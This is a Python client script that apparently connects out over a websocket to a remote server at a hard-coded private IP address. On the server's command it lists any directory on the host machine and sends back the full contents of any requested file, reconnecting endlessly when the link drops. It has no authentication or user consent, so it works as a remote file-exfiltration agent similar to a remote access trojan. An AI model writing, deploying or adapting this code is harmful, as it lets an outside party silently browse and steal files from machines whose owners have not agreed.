import os
import sys
import json
import asyncio
import websockets
import time
import string
import ctypes
from datetime import datetime

# Default connection settings
DEFAULT_SERVER_IP = '192.168.29.193'
DEFAULT_SERVER_PORT = 8080  # Single port for everything

# Add at the top level
file_cache = {}

def get_drives():
    """Get list of Windows drives"""
    drives = []
    if os.name == 'nt':  # Windows
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive = f"{letter}:\\"
                try:
                    # Check if drive is accessible
                    os.listdir(drive)
                    drives.append(drive)
                except:
                    pass
            bitmask >>= 1
    else:  # Linux/Mac
        drives.append('/')
    return drives

def scan_directory(path):
    """Scan directory and return file information"""
    files = {}
    try:
        # Ensure proper Windows path format
        if os.name == 'nt' and ':' in path:
            path = path.rstrip('/\\') + '\\'  # Ensure trailing backslash for drives
        
        print(f"Attempting to scan: {path}")
        
        try:
            entries = os.listdir(path)
            print(f"Found {len(entries)} entries")
            
            for entry in entries:
                try:
                    full_path = os.path.join(path, entry)
                    stat = os.stat(full_path)
                    is_dir = os.path.isdir(full_path)
                    
                    # Skip system and hidden files on Windows
                    if os.name == 'nt':
                        try:
                            file_attributes = ctypes.windll.kernel32.GetFileAttributesW(full_path)
                            if file_attributes == -1:  # Invalid file
                                continue
                            if file_attributes & 0x2:  # Hidden
                                continue
                            if file_attributes & 0x4:  # System
                                continue
                        except:
                            continue
                    
                    files[entry] = {
                        'name': entry,
                        'is_dir': is_dir,
                        'size': 0 if is_dir else stat.st_size,
                        'mtime': stat.st_mtime,
                        'full_path': full_path.replace('\\', '/'),  # Store full path for navigation
                        'parent_path': path.replace('\\', '/')  # Store parent path for context
                    }
                    print(f"Added: {entry}")
                    
                except (PermissionError, OSError) as e:
                    print(f"Permission error for {entry}: {e}")
                    continue
                except Exception as e:
                    print(f"Error processing {entry}: {e}")
                    continue
                    
        except PermissionError as e:
            print(f"Permission denied accessing directory: {e}")
        except Exception as e:
            print(f"Error listing directory: {e}")
            
    except Exception as e:
        print(f"Error in scan_directory: {e}")
    
    return files

def normalize_path(path):
    """Normalize path for consistent handling"""
    if os.name == 'nt':  # Windows
        # Remove leading dots and slashes
        path = path.lstrip('./\\')
        
        # Handle drive letter paths
        if ':' in path:
            drive, rest = path.split(':', 1)
            # Clean up the rest of the path
            rest = rest.strip('/\\')
            # Reconstruct with proper format
            if rest:
                return f"{drive}:\\{rest}"  # Need backslash for Windows
            else:
                return f"{drive}:\\"  # Need backslash for root drive
        return path
    return path

async def main():
    # Use command line arguments if provided, otherwise use defaults
    server_ip = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_SERVER_IP
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_SERVER_PORT
    
    uri = f"ws://{server_ip}:{server_port}/ws"

    try:
        async with websockets.connect(uri) as websocket:
            print(f"[+] Connected to server at {server_ip}:{server_port}")

            # Send initial drive list
            drives = get_drives()
            drive_list = {}
            for drive in drives:
                drive_letter = drive[0]
                try:
                    stat = os.stat(drive)
                    drive_list[f"{drive_letter}:"] = {
                        'name': drive,
                        'is_dir': True,
                        'size': 0,
                        'mtime': stat.st_mtime
                    }
                except Exception as e:
                    print(f"Error getting drive info for {drive}: {e}")

            response = json.dumps(drive_list)
            await websocket.send(response)

            while True:
                try:
                    command = await websocket.recv()
                    if not command:
                        break

                    if command.startswith('PATH:'):
                        requested_path = command[5:]
                        print(f"Received path request: {requested_path}")
                        
                        if requested_path == '.':
                            response = json.dumps(drive_list)
                        else:
                            requested_path = normalize_path(requested_path)
                            print(f"Normalized path: {requested_path}")
                            
                            files = scan_directory(requested_path)
                            print(f"Scanned files: {len(files)}")
                            
                            # Format paths for web interface
                            web_files = {}
                            for name, info in files.items():
                                web_files[name] = info
                            
                            response = json.dumps(web_files)
                        
                        await websocket.send(response)
                    elif command.startswith('DOWNLOAD:'):
                        file_path = command[9:]
                        try:
                            file_path = normalize_path(file_path)
                            print(f"Reading file: {file_path}")
                            
                            with open(file_path, 'rb') as f:
                                file_data = f.read()
                            
                            print(f"Sending file: {file_path} ({len(file_data)} bytes)")
                            await websocket.send(file_data)
                            
                        except Exception as e:
                            print(f"Error reading file {file_path}: {e}")
                            await websocket.send(b'')

                except websockets.exceptions.ConnectionClosed:
                    print("Connection closed, attempting to reconnect...")
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
                    break

    except Exception as e:
        print(f"[!] Connection error: {e}")

    # Reconnection with delay
    await asyncio.sleep(2)
    print("Attempting to reconnect...")
    await main()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Client shutting down...")
        sys.exit(0) 